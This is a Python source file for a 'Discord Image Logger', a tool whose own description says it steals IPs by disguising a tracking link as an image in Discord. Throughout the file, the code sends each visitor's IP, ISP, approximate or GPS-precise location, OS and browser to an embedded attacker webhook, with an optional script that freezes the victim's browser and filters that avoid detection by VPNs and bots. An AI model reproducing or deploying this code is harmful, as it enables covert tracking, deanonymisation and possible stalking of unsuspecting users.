# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445779699388387470/4ftaHojI3TfjQ7L7aKolxbHF_4FB9UJtWmbmd94wJk8nhSmsMwXGqqPSQogZ735-w3y9",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
